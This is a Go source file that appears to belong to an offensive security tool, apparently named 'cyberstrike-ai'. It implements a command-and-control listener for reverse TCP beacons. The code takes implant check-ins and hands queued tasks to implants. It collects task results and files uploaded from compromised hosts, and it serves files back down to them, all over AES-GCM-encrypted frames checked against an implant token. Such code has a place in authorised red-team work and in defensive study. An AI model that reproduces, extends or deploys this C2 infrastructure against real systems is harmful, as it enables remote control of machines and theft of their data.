package c2

import (
	"bufio"
	"crypto/subtle"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"cyberstrike-ai/internal/database"

	"go.uber.org/zap"
)

// tcpBeaconMagic 二进制 Beacon 在反向 TCP 连接建立后首先发送的 4 字节，用于与经典 shell 反弹区分。
const tcpBeaconMagic = "CSB1"

// tcpBeaconPeekTimeout 等待 CSB1 魔数的探测窗口；合法 Beacon 连接后立即发送魔数。
const tcpBeaconPeekTimeout = 2 * time.Second

// tcpBeaconMaxFrame 单帧密文（base64 字符串）最大字节数，防止 OOM。
const tcpBeaconMaxFrame = 64 << 20

func readTCPBeaconFrame(r *bufio.Reader) (cipherB64 string, err error) {
	var n uint32
	if err = binary.Read(r, binary.BigEndian, &n); err != nil {
		return "", err
	}
	if n == 0 || int64(n) > int64(tcpBeaconMaxFrame) {
		return "", fmt.Errorf("invalid tcp beacon frame size")
	}
	buf := make([]byte, n)
	if _, err = io.ReadFull(r, buf); err != nil {
		return "", err
	}
	return string(buf), nil
}

func writeTCPBeaconFrame(mu *sync.Mutex, conn net.Conn, cipherB64 string) error {
	if mu != nil {
		mu.Lock()
		defer mu.Unlock()
	}
	payload := []byte(cipherB64)
	if len(payload) > tcpBeaconMaxFrame {
		return fmt.Errorf("frame too large")
	}
	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(payload)))
	if _, err := conn.Write(hdr[:]); err != nil {
		return err
	}
	_, err := conn.Write(payload)
	return err
}

func tcpBeaconCheckToken(expected, got string) bool {
	if got == "" || expected == "" {
		return false
	}
	return subtle.ConstantTimeCompare([]byte(got), []byte(expected)) == 1
}

// handleTCPBeaconSession 处理已消费魔数 CSB1 之后的 TCP Beacon 会话（与 HTTP Beacon 相同的 AES-GCM + JSON 语义）。
func (l *TCPReverseListener) handleTCPBeaconSession(conn net.Conn, br *bufio.Reader) {
	var writeMu sync.Mutex
	defer func() {
		_ = conn.Close()
	}()

	for {
		_ = conn.SetReadDeadline(time.Now().Add(6 * time.Minute))
		cipherB64, err := readTCPBeaconFrame(br)
		if err != nil {
			if err != io.EOF && !isClosedConnErr(err) {
				l.logger.Debug("tcp beacon read frame", zap.Error(err))
			}
			return
		}
		plain, err := DecryptAESGCM(l.rec.EncryptionKey, cipherB64)
		if err != nil {
			l.logger.Warn("tcp beacon decrypt failed", zap.Error(err))
			return
		}

		var env map[string]json.RawMessage
		if err := json.Unmarshal(plain, &env); err != nil {
			l.logger.Warn("tcp beacon json", zap.Error(err))
			return
		}
		opBytes, ok := env["op"]
		if !ok {
			return
		}
		var op string
		if err := json.Unmarshal(opBytes, &op); err != nil {
			return
		}
		var token string
		if tb, ok := env["token"]; ok {
			_ = json.Unmarshal(tb, &token)
		}
		if !tcpBeaconCheckToken(l.rec.ImplantToken, token) {
			l.logger.Warn("tcp beacon bad token", zap.String("listener_id", l.rec.ID))
			return
		}

		var resp interface{}
		switch op {
		case "check_in":
			rawCheck, ok := env["check"]
			if !ok {
				return
			}
			var req ImplantCheckInRequest
			if err := json.Unmarshal(rawCheck, &req); err != nil {
				return
			}
			if req.UserAgent == "" {
				req.UserAgent = "tcp_beacon"
			}
			if req.SleepSeconds <= 0 {
				req.SleepSeconds = l.cfg.DefaultSleep
			}
			host, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
			if req.Metadata == nil {
				req.Metadata = map[string]interface{}{}
			}
			req.Metadata["transport"] = "tcp_beacon"
			req.Metadata["remote"] = conn.RemoteAddr().String()
			if strings.TrimSpace(req.InternalIP) == "" {
				req.InternalIP = host
			}
			session, err := l.manager.IngestCheckIn(l.rec.ID, req)
			if err != nil {
				l.logger.Warn("tcp beacon check_in", zap.Error(err))
				return
			}
			queued, _ := l.manager.DB().ListC2Tasks(database.ListC2TasksFilter{
				SessionID: session.ID,
				Status:    string(TaskQueued),
				Limit:     1,
			})
			resp = ImplantCheckInResponse{
				SessionID:  session.ID,
				NextSleep:  session.SleepSeconds,
				NextJitter: session.JitterPercent,
				HasTasks:   len(queued) > 0,
				ServerTime: NowUnixMillis(),
			}

		case "tasks":
			rawSID, ok := env["session_id"]
			if !ok {
				return
			}
			var sessionID string
			if err := json.Unmarshal(rawSID, &sessionID); err != nil || sessionID == "" {
				return
			}
			sess, err := l.manager.DB().GetC2Session(sessionID)
			if err != nil || sess == nil || sess.ListenerID != l.rec.ID {
				return
			}
			envelopes, err := l.manager.PopTasksForBeacon(sessionID, 50)
			if err != nil {
				return
			}
			if envelopes == nil {
				envelopes = []TaskEnvelope{}
			}
			resp = map[string]interface{}{"tasks": envelopes}

		case "result":
			raw, ok := env["result"]
			if !ok {
				return
			}
			var report TaskResultReport
			if err := json.Unmarshal(raw, &report); err != nil {
				return
			}
			if err := l.manager.IngestTaskResult(report); err != nil {
				return
			}
			resp = map[string]string{"ok": "1"}

		case "upload":
			raw, ok := env["upload"]
			if !ok {
				return
			}
			var up struct {
				TaskID  string `json:"task_id"`
				DataB64 string `json:"data_b64"`
			}
			if err := json.Unmarshal(raw, &up); err != nil || up.TaskID == "" {
				return
			}
			plainFile, err := base64.StdEncoding.DecodeString(up.DataB64)
			if err != nil {
				return
			}
			dir, dst, err := uploadPathForTask(l.manager.StorageDir(), up.TaskID)
			if err != nil {
				return
			}
			if err := os.MkdirAll(dir, 0o755); err != nil {
				return
			}
			if err := os.WriteFile(dst, plainFile, 0o644); err != nil {
				return
			}
			resp = map[string]interface{}{"ok": 1, "size": len(plainFile)}

		case "file":
			raw, ok := env["file"]
			if !ok {
				return
			}
			var fr struct {
				FileID string `json:"file_id"`
			}
			if err := json.Unmarshal(raw, &fr); err != nil || fr.FileID == "" {
				return
			}
			if strings.Contains(fr.FileID, "/") || strings.Contains(fr.FileID, "\\") || strings.Contains(fr.FileID, "..") {
				return
			}
			fpath := filepath.Join(l.manager.StorageDir(), "downstream", fr.FileID+".bin")
			absPath, err := filepath.Abs(fpath)
			if err != nil {
				return
			}
			absDir, err := filepath.Abs(filepath.Join(l.manager.StorageDir(), "downstream"))
			if err != nil || !strings.HasPrefix(absPath, absDir+string(filepath.Separator)) {
				return
			}
			data, err := os.ReadFile(absPath)
			if err != nil {
				return
			}
			resp = map[string]interface{}{
				"file_data": base64Encode(data),
			}

		default:
			return
		}

		body, err := json.Marshal(resp)
		if err != nil {
			return
		}
		enc, err := EncryptAESGCM(l.rec.EncryptionKey, body)
		if err != nil {
			return
		}
		_ = conn.SetWriteDeadline(time.Now().Add(3 * time.Minute))
		if err := writeTCPBeaconFrame(&writeMu, conn, enc); err != nil {
			return
		}
	}
}
